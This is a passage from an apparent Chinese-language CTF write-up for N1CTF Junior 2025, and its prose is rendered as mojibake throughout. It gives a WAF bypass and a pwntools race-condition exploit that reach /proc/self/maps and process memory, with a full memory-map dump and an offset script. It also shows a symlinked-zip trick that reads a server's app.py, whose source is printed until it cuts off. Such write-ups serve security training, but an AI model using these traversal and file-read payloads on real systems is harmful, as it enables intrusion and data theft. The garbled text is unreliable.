<span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç›´æ¥æŠŠ flag è¯»åˆ°å†…å­˜ä¹‹ååˆ äº†</p><h2 id="éé¢„æœŸ"><a href="#éé¢„æœŸ" class="headerlink" title="éé¢„æœŸ"></a>éé¢„æœŸ</h2><p>æ³¨æ„è¿™é‡Œï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">pattern <span class="token operator">=</span> <span class="token string">rb'\?offset=(\d+)&amp;length=(\d+)'</span>clean_path <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> <span class="token string">b''</span><span class="token punctuation">,</span> path<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>åŒ¹é…ç›´æ¥æ›¿æ¢ä¸ºç©ºæ˜¯ä¸€ä¸ªå±é™©çš„è®¾è®¡ï¼Œç”¨è¿™ä¸ªæ’åœ¨ä¸¤ä¸ªå­—ç¬¦ä¹‹é—´å³å¯ç»•è¿‡ forbidden</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/.?offset=0&amp;length=100000.?offset=0&amp;length=10000/pr?offset=0&amp;length=100000oc/self/maps</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">60.205.163.215:17309</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å› ä¸º flag è¯»åˆ°å†…å­˜é‡Œäº†ï¼Œæˆ‘ä»¬éœ€è¦è¯» &#x2F;proc&#x2F;self&#x2F;memï¼Œå…ˆè·å– maps</p><p><img src="/blog/2025/09/13/N1CTF-Junior-2025-2-2/IMG-20250914120217077.png"></p><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">56395827e000-56395827f000 r--p 00000000 103:00 15523385                  /usr/local/bin/python3.1256395827f000-563958280000 r-xp 00001000 103:00 15523385                  /usr/local/bin/python3.12563958280000-563958281000 r--p 00002000 103:00 15523385                  /usr/local/bin/python3.12563958281000-563958282000 r--p 00002000 103:00 15523385                  /usr/local/bin/python3.12563958282000-563958283000 rw-p 00003000 103:00 15523385                  /usr/local/bin/python3.12563959f5f000-56395a3b0000 rw-p 00000000 00:00 0                          [heap]7fa2fe996000-7fa2fe998000 r--p 00000000 103:00 15524156                  /usr/local/lib/python3.12/lib-dynload/mmap.cpython-312-x86_64-linux-gnu.so7fa2fe998000-7fa2fe99b000 r-xp 00002000 103:00 15524156                  /usr/local/lib/python3.12/lib-dynload/mmap.cpython-312-x86_64-linux-gnu.so7fa2fe99b000-7fa2fe99d000 r--p 00005000 103:00 15524156                  /usr/local/lib/python3.12/lib-dynload/mmap.cpython-312-x86_64-linux-gnu.so7fa2fe99d000-7fa2fe99e000 r--p 00006000 103:00 15524156                  /usr/local/lib/python3.12/lib-dynload/mmap.cpython-312-x86_64-linux-gnu.so7fa2fe99e000-7fa2fe99f000 rw-p 00007000 103:00 15524156                  /usr/local/lib/python3.12/lib-dynload/mmap.cpython-312-x86_64-linux-gnu.so7fa2fe99f000-7fa2fe9a0000 r--p 00000000 103:00 15524153                  /usr/local/lib/python3.12/lib-dynload/fcntl.cpython-312-x86_64-linux-gnu.so7fa2fe9a0000-7fa2fe9a2000 r-xp 00001000 103:00 15524153                  /usr/local/lib/python3.12/lib-dynload/fcntl.cpython-312-x86_64-linux-gnu.so7fa2fe9a2000-7fa2fe9a4000 r--p 00003000 103:00 15524153                  /usr/local/lib/python3.12/lib-dynload/fcntl.cpython-312-x86_64-linux-gnu.so7fa2fe9a4000-7fa2fe9a5000 r--p 00004000 103:00 15524153                  /usr/local/lib/python3.12/lib-dynload/fcntl.cpython-312-x86_64-linux-gnu.so7fa2fe9a5000-7fa2fe9a6000 rw-p 00005000 103:00 15524153                  /usr/local/lib/python3.12/lib-dynload/fcntl.cpython-312-x86_64-linux-gnu.so7fa2fe9a6000-7fa2fe9a8000 r--p 00000000 103:00 15524094                  /usr/local/lib/python3.12/lib-dynload/_blake2.cpython-312-x86_64-linux-gnu.so7fa2fe9a8000-7fa2fe9af000 r-xp 00002000 103:00 15524094                  /usr/local/lib/python3.12/lib-dynload/_blake2.cpython-312-x86_64-linux-gnu.so7fa2fe9af000-7fa2fe9b1000 r--p 00009000 103:00 15524094                  /usr/local/lib/python3.12/lib-dynload/_blake2.cpython-312-x86_64-linux-gnu.so7fa2fe9b1000-7fa2fe9b2000 r--p 0000a000 103:00 15524094                  /usr/local/lib/python3.12/lib-dynload/_blake2.cpython-312-x86_64-linux-gnu.so7fa2fe9b2000-7fa2fe9b3000 rw-p 0000b000 103:00 15524094                  /usr/local/lib/python3.12/lib-dynload/_blake2.cpython-312-x86_64-linux-gnu.so7fa2fe9b3000-7fa2fe9b8000 r--p 00000000 103:00 15520405                  /usr/lib/x86_64-linux-gnu/libzstd.so.1.5.77fa2fe9b8000-7fa2fea67000 r-xp 00005000 103:00 15520405                  /usr/lib/x86_64-linux-gnu/libzstd.so.1.5.77fa2fea67000-7fa2fea7b000 r--p 000b4000 103:00 15520405                  /usr/lib/x86_64-linux-gnu/libzstd.so.1.5.77fa2fea7b000-7fa2fea7c000 r--p 000c8000 103:00 15520405                  /usr/lib/x86_64-linux-gnu/libzstd.so.1.5.77fa2fea7c000-7fa2fea7d000 rw-p 000c9000 103:00 15520405                  /usr/lib/x86_64-linux-gnu/libzstd.so.1.5.77fa2fea7d000-7fa2fea80000 r--p 00000000 103:00 15520403                  /usr/lib/x86_64-linux-gnu/libz.so.1.3.17fa2fea80000-7fa2fea94000 r-xp 00003000 103:00 15520403                  /usr/lib/x86_64-linux-gnu/libz.so.1.3.17fa2fea94000-7fa2fea9b000 r--p 00017000 103:00 15520403                  /usr/lib/x86_64-linux-gnu/libz.so.1.3.17fa2fea9b000-7fa2fea9c000 r--p 0001d000 103:00 15520403                  /usr/lib/x86_64-linux-gnu/libz.so.1.3.17fa2fea9c000-7fa2fea9d000 rw-p 0001e000 103:00 15520403                  /usr/lib/x86_64-linux-gnu/libz.so.1.3.17fa2fea9d000-7fa2feb94000 r--p 00000000 103:00 15520163                  /usr/lib/x86_64-linux-gnu/libcrypto.so.37fa2feb94000-7fa2fef15000 r-xp 000f7000 103:00 15520163                  /usr/lib/x86_64-linux-gnu/libcrypto.so.37fa2fef15000-7fa2ff04c000 r--p 00478000 103:00 15520163                  /usr/lib/x86_64-linux-gnu/libcrypto.so.37fa2ff04c000-7fa2ff0cf000 r--p 005ae000 103:00 15520163                  /usr/lib/x86_64-linux-gnu/libcrypto.so.37fa2ff0cf000-7fa2ff0d2000 rw-p 00631000 103:00 15520163                  /usr/lib/x86_64-linux-gnu/libcrypto.so.37fa2ff0d2000-7fa2ff0d5000 rw-p 00000000 00:00 0 7fa2ff0d5000-7fa2ff0d9000 r--p 00000000 103:00 15524114                  /usr/local/lib/python3.12/lib-dynload/_hashlib.cpython-312-x86_64-linux-gnu.so7fa2ff0d9000-7fa2ff0df000 r-xp 00004000 103:00 15524114                  /usr/local/lib/python3.12/lib-dynload/_hashlib.cpython-312-x86_64-linux-gnu.so7fa2ff0df000-7fa2ff0e3000 r--p 0000a000 103:00 15524114                  /usr/local/lib/python3.12/lib-dynload/_hashlib.cpython-312-x86_64-linux-gnu.so7fa2ff0e3000-7fa2ff0e4000 r--p 0000d000 103:00 15524114                  /usr/local/lib/python3.12/lib-dynload/_hashlib.cpython-312-x86_64-linux-gnu.so7fa2ff0e4000-7fa2ff0e6000 rw-p 0000e000 103:00 15524114                  /usr/local/lib/python3.12/lib-dynload/_hashlib.cpython-312-x86_64-linux-gnu.so7fa2ff0e6000-7fa2ff0ea000 r--p 00000000 103:00 15524149                  /usr/local/lib/python3.12/lib-dynload/array.cpython-312-x86_64-linux-gnu.so7fa2ff0ea000-7fa2ff0f1000 r-xp 00004000 103:00 15524149                  /usr/local/lib/python3.12/lib-dynload/array.cpython-312-x86_64-linux-gnu.so7fa2ff0f1000-7fa2ff0f5000 r--p 0000b000 103:00 15524149                  /usr/local/lib/python3.12/lib-dynload/array.cpython-312-x86_64-linux-gnu.so7fa2ff0f5000-7fa2ff0f6000 r--p 0000f000 103:00 15524149                  /usr/local/lib/python3.12/lib-dynload/array.cpython-312-x86_64-linux-gnu.so7fa2ff0f6000-7fa2ff0f7000 rw-p 00010000 103:00 15524149                  /usr/local/lib/python3.12/lib-dynload/array.cpython-312-x86_64-linux-gnu.so7fa2ff0f7000-7fa2ff1f7000 rw-p 00000000 00:00 0 7fa2ff1f7000-7fa2ff1f9000 r--p 00000000 103:00 15524161                  /usr/local/lib/python3.12/lib-dynload/select.cpython-312-x86_64-linux-gnu.so7fa2ff1f9000-7fa2ff1fc000 r-xp 00002000 103:00 15524161                  /usr/local/lib/python3.12/lib-dynload/select.cpython-312-x86_64-linux-gnu.so7fa2ff1fc000-7fa2ff1fe000 r--p 00005000 103:00 15524161                  /usr/local/lib/python3.12/lib-dynload/select.cpython-312-x86_64-linux-gnu.so7fa2ff1fe000-7fa2ff1ff000 r--p 00006000 103:00 15524161                  /usr/local/lib/python3.12/lib-dynload/select.cpython-312-x86_64-linux-gnu.so7fa2ff1ff000-7fa2ff200000 rw-p 00007000 103:00 15524161                  /usr/local/lib/python3.12/lib-dynload/select.cpython-312-x86_64-linux-gnu.so7fa2ff200000-7fa2ff300000 rw-p 00000000 00:00 0 7fa2ff300000-7fa2ff304000 r--p 00000000 103:00 15524131                  /usr/local/lib/python3.12/lib-dynload/_socket.cpython-312-x86_64-linux-gnu.so7fa2ff304000-7fa2ff30f000 r-xp 00004000 103:00 15524131                  /usr/local/lib/python3.12/lib-dynload/_socket.cpython-312-x86_64-linux-gnu.so7fa2ff30f000-7fa2ff318000 r--p 0000f000 103:00 15524131                  /usr/local/lib/python3.12/lib-dynload/_socket.cpython-312-x86_64-linux-gnu.so7fa2ff318000-7fa2ff319000 r--p 00017000 103:00 15524131                  /usr/local/lib/python3.12/lib-dynload/_socket.cpython-312-x86_64-linux-gnu.so7fa2ff319000-7fa2ff31a000 rw-p 00018000 103:00 15524131                  /usr/local/lib/python3.12/lib-dynload/_socket.cpython-312-x86_64-linux-gnu.so7fa2ff31a000-7fa2ff51a000 rw-p 00000000 00:00 0 7fa2ff51a000-7fa2ff52b000 r--p 00000000 103:00 15520236                  /usr/lib/x86_64-linux-gnu/libm.so.67fa2ff52b000-7fa2ff5a8000 r-xp 00011000 103:00 15520236                  /usr/lib/x86_64-linux-gnu/libm.so.67fa2ff5a8000-7fa2ff608000 r--p 0008e000 103:00 15520236                  /usr/lib/x86_64-linux-gnu/libm.so.67fa2ff608000-7fa2ff609000 r--p 000ed000 103:00 15520236                  /usr/lib/x86_64-linux-gnu/libm.so.67fa2ff609000-7fa2ff60a000 rw-p 000ee000 103:00 15520236                  /usr/lib/x86_64-linux-gnu/libm.so.67fa2ff60a000-7fa2ff632000 r--p 00000000 103:00 15520148                  /usr/lib/x86_64-linux-gnu/libc.so.67fa2ff632000-7fa2ff797000 r-xp 00028000 103:00 15520148                  /usr/lib/x86_64-linux-gnu/libc.so.67fa2ff797000-7fa2ff7ed000 r--p 0018d000 103:00 15520148                  /usr/lib/x86_64-linux-gnu/libc.so.67fa2ff7ed000-7fa2ff7f1000 r--p 001e2000 103:00 15520148                  /usr/lib/x86_64-linux-gnu/libc.so.67fa2ff7f1000-7fa2ff7f3000 rw-p 001e6000 103:00 15520148                  /usr/lib/x86_64-linux-gnu/libc.so.67fa2ff7f3000-7fa2ff800000 rw-p 00000000 00:00 0 7fa2ff800000-7fa2ff900000 r--p 00000000 103:00 15523607                  /usr/local/lib/libpython3.12.so.1.07fa2ff900000-7fa2ffb1f000 r-xp 00100000 103:00 15523607                  /usr/local/lib/libpython3.12.so.1.07fa2ffb1f000-7fa2ffc6f000 r--p 0031f000 103:00 15523607                  /usr/local/lib/libpython3.12.so.1.07fa2ffc6f000-7fa2ffce6000 r--p 0046e000 103:00 15523607                  /usr/local/lib/libpython3.12.so.1.07fa2ffce6000-7fa2ffe55000 rw-p 004e5000 103:00 15523607                  /usr/local/lib/libpython3.12.so.1.07fa2ffe55000-7fa2ffe56000 rw-p 00000000 00:00 0 7fa2ffe5c000-7fa2ffe5f000 r--p 00000000 103:00 15524155                  /usr/local/lib/python3.12/lib-dynload/math.cpython-312-x86_64-linux-gnu.so7fa2ffe5f000-7fa2ffe67000 r-xp 00003000 103:00 15524155                  /usr/local/lib/python3.12/lib-dynload/math.cpython-312-x86_64-linux-gnu.so7fa2ffe67000-7fa2ffe6c000 r--p 0000b000 103:00 15524155                  /usr/local/lib/python3.12/lib-dynload/math.cpython-312-x86_64-linux-gnu.so7fa2ffe6c000-7fa2ffe6d000 r--p 0000f000 103:00 15524155                  /usr/local/lib/python3.12/lib-dynload/math.cpython-312-x86_64-linux-gnu.so7fa2ffe6d000-7fa2ffe6e000 rw-p 00010000 103:00 15524155                  /usr/local/lib/python3.12/lib-dynload/math.cpython-312-x86_64-linux-gnu.so7fa2ffe6e000-7fa2ffed4000 rw-p 00000000 00:00 0 7fa2ffed4000-7fa2ffedb000 r--s 00000000 103:00 15520059                  /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache7fa2ffedb000-7fa2fff35000 r--p 00000000 103:00 15519696                  /usr/lib/locale/C.utf8/LC_CTYPE7fa2fff35000-7fa2fff37000 rw-p 00000000 00:00 0 7fa2fff38000-7fa2fff39000 rw-s 00000000 00:01 6174                       /dev/zero (deleted)7fa2fff39000-7fa2fff3b000 rw-p 00000000 00:00 0 7fa2fff3b000-7fa2fff3c000 r--p 00000000 103:00 15520122                  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.27fa2fff3c000-7fa2fff64000 r-xp 00001000 103:00 15520122                  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.27fa2fff64000-7fa2fff6f000 r--p 00029000 103:00 15520122                  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.27fa2fff6f000-7fa2fff71000 r--p 00034000 103:00 15520122                  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.27fa2fff71000-7fa2fff72000 rw-p 00036000 103:00 15520122                  /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.27fa2fff72000-7fa2fff73000 rw-p 00000000 00:00 0 7ffe68e9d000-7ffe68ebe000 rw-p 00000000 00:00 0                          [stack]7ffe68ec9000-7ffe68ecd000 r--p 00000000 00:00 0                          [vvar]7ffe68ecd000-7ffe68ecf000 r-xp 00000000 00:00 0                          [vdso]ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç„¶åæå‡ºç¥–ä¼ è„šæœ¬ç®—åç§»å’Œé•¿åº¦ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> remaps<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'maps'</span><span class="token punctuation">)</span>b <span class="token operator">=</span> maps<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token builtin">list</span> <span class="token operator">=</span> b<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token keyword">for</span> line <span class="token keyword">in</span> <span class="token builtin">list</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'rw'</span> <span class="token keyword">in</span> line<span class="token punctuation">:</span>        addr <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'([0-9a-f]+)-([0-9a-f]+)'</span><span class="token punctuation">,</span>line<span class="token punctuation">)</span>        <span class="token comment">#æ­£åˆ™åŒ¹é…åœ°å€,åœ°å€æ ¼å¼ä¸ºåå…­è¿›åˆ¶æ•°[0-9a-f],reserchä¼šè¿”å›ä¸€ä¸ªre.Matchå¯¹è±¡ï¼Œç”¨æ‹¬å·æ‹¬èµ·æ¥æ˜¯ä¸ºäº†ä½¿ç”¨group()å¤„ç†è¿”å›ç»“æœã€‚</span>        start <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>addr<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment">#å°†åå…­è¿›åˆ¶å­—ç¬¦è½¬åŒ–ä¸ºåè¿›åˆ¶æ•°ï¼Œä¸ºäº†ç¬¦åˆstartå‚æ•°æ ¼å¼å‚è€ƒé“¾æ¥</span>        end <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>addr<span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>    <span class="token comment">#å°†åå…­è¿›åˆ¶å­—ç¬¦è½¬åŒ–ä¸ºåè¿›åˆ¶æ•°ï¼Œä¸ºäº†ç¬¦åˆendå‚æ•°æ ¼å¼</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>start<span class="token punctuation">,</span>end<span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>end<span class="token operator">-</span>start<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å› ä¸ºä¸æ¸…æ¥šåœ¨å“ªä¸€æ®µå†…å­˜é‡Œé¢äºæ˜¯æ¯ä¸ªéƒ½ç®—å‡ºæ¥æ‰‹åŠ¨ fuzz äº†ï¼ˆ</p><p><img src="/blog/2025/09/13/N1CTF-Junior-2025-2-2/IMG-20250914115708081.png"></p><p>æœ€åä¹Ÿæ˜¯å¯ä»¥çœ‹åˆ°æ˜¯åœ¨ <code>/usr/local/lib/python3.12/lib-dynload/select.cpython-312-x86_64-linux-gnu.so</code> è¿™ä¸€æ®µé‡Œé¢</p><h2 id="é¢„æœŸ"><a href="#é¢„æœŸ" class="headerlink" title="é¢„æœŸ"></a>é¢„æœŸ</h2><p>ç»™äº†é‚£ä¹ˆå¤§ä¸€ä¸ª log ä¸å¯èƒ½ä¸ç”¨</p><p>ä»£ç é‡Œè¿›è¡Œäº†ä¸¤æ¬¡ recvï¼Œä¸ waf ç›¸å…³çš„æ˜¯è¿™ä¸€æ®µ</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">initial_data <span class="token operator">=</span> conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">,</span> socket<span class="token punctuation">.</span>MSG_PEEK<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span>term <span class="token keyword">in</span> initial_data<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> term <span class="token keyword">in</span> FORBIDDEN<span class="token punctuation">)</span><span class="token punctuation">:</span>    conn<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span><span class="token string">b"HTTP/1.1 403 Forbidden\r\n\r\nSuspicious request pattern detected."</span><span class="token punctuation">)</span>    conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">continue</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>é€šå¸¸ recv() å‡½æ•°çš„æœ€åä¸€ä¸ªå‚æ•°ä¸º0ï¼Œä»£è¡¨ä»ç¼“å†²åŒºå–èµ°æ•°æ®ï¼Œè€Œå½“ä¸º MSG_PEEK æ—¶ä»£è¡¨åªæ˜¯æŸ¥çœ‹æ•°æ®ï¼Œè€Œä¸å–èµ°æ•°æ®ã€‚</p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´æ•°æ®ä¼šç•™åœ¨ç¼“å†²åŒºï¼Œè€Œæ­£å¼è¯»å…¥æ˜¯åœ¨ handle_connectionï¼Œä¸€æ—¦è¯»å–åˆ™ä¼šæŠŠæ•°æ®ç§»é™¤ç¼“å†²åŒº</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">handle_connection</span><span class="token punctuation">(</span>conn<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> log<span class="token punctuation">,</span> factor<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        conn<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">10.0</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> log<span class="token punctuation">:</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'log.txt'</span><span class="token punctuation">,</span> <span class="token string">'a'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                fcntl<span class="token punctuation">.</span>flock<span class="token punctuation">(</span>f<span class="token punctuation">,</span> fcntl<span class="token punctuation">.</span>LOCK_EX<span class="token punctuation">)</span>                log_bytes <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>addr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>addr<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">str</span><span class="token punctuation">(</span>conn<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>factor<span class="token punctuation">)</span><span class="token punctuation">:</span>                    log_bytes <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>sha3_256<span class="token punctuation">(</span>log_bytes<span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span>                log_entry <span class="token operator">=</span> log_bytes<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"\n"</span>                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>log_entry<span class="token punctuation">)</span>                        request_data <span class="token operator">=</span> conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨è¯»å…¥å‰ï¼Œå¦‚æœå¼€äº† log æ¨¡å¼ï¼Œä¼šä¼˜å…ˆè¿›è¡Œ log å†è¯»å…¥ï¼Œè€Œå¦‚æœè¿™é‡Œ factor çš„å€¼ç»™é«˜äº†åˆ™ä¼šå¡åœ¨ log è¿™é‡Œä¸€æ®µæ—¶é—´ï¼Œé‚£ä¹ˆç¼“å†²åŒºä¸­å°±ä¼šæŒç»­å­˜åœ¨ <code>GET /?log=1&amp;factor=100000</code>ï¼Œæ­¤æ—¶å¦‚æœåœ¨é€šè¿‡ MSG_PEEK åç¼“å†²åŒºè¿˜æœªæ¸…é™¤ä¹‹å‰ç«‹åˆ»æ’å…¥ <code>/../../../proc/self/maps</code> ï¼Œé‚£ä¹ˆå®é™…è¿›å…¥ <code>request_data = conn.recv(256)</code> çš„ç¼“å†²åŒºå†…ä¸º <code>GET /?log=1&amp;factor=100000/../../../proc/self/maps </code></p><p>expï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>host <span class="token operator">=</span> <span class="token string">'localhost'</span>port <span class="token operator">=</span> <span class="token number">1337</span>remote1 <span class="token operator">=</span> remote<span class="token punctuation">(</span>host<span class="token punctuation">,</span> port<span class="token punctuation">)</span>remote1<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'GET /?log=1&amp;factor=100000'</span><span class="token punctuation">)</span>time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">0.01</span><span class="token punctuation">)</span>remote1<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'/../../../../proc/self/maps'</span></span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>resp <span class="token operator">=</span> remote1<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™æ ·å°±èƒ½è¯»åˆ° mapsï¼Œç„¶åå°±æ˜¯ç¿» mem äº†</p><hr><h1 id="online-unzipper"><a href="#online-unzipper" class="headerlink" title="online_unzipper"></a>online_unzipper</h1><p>ç»™äº†ä¸ªæ³¨å†Œï¼Œæœ‰ sessionï¼Œè§£å‡ºæ¥æ˜¯ <code>&#123;&quot;role&quot;:&quot;user&quot;,&quot;username&quot;:&quot;admin&quot;&#125;</code></p><p>æœ‰å‹ç¼©åŒ…ä¸Šä¼ å¹¶è§£å‹ï¼Œæ˜æ˜¾æ˜¯æ‰“è½¯é“¾æ¥ï¼Œè¯» app.py</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ln</span> <span class="token parameter variable">-s</span> /app/app.py toapppy<span class="token function">zip</span> <span class="token parameter variable">-y</span> ln.zip toapppy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä¸Šä¼ è§£å‹ï¼Œç„¶åè®¿é—® toapppy å¾—åˆ°æºç </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">import</span> uuid<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span>send_file<span class="token punctuation">,</span>render_template<span class="token punctuation">,</span> session<span class="token punctuation">,</span> send_from_directory<span class="token punctuation">,</span> abort<span class="token punctuation">,</span> Responseapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"FLASK_SECRET_KEY"</span><span class="token punctuation">,</span> <span class="token string">"test_key"</span><span class="token punctuation">)</span>UPLOAD_FOLDER <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"uploads"</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>UPLOAD_FOLDER<span class="token punctuation">,</span> exist_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>users <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">"username"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"login"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">"upload"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/register"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token 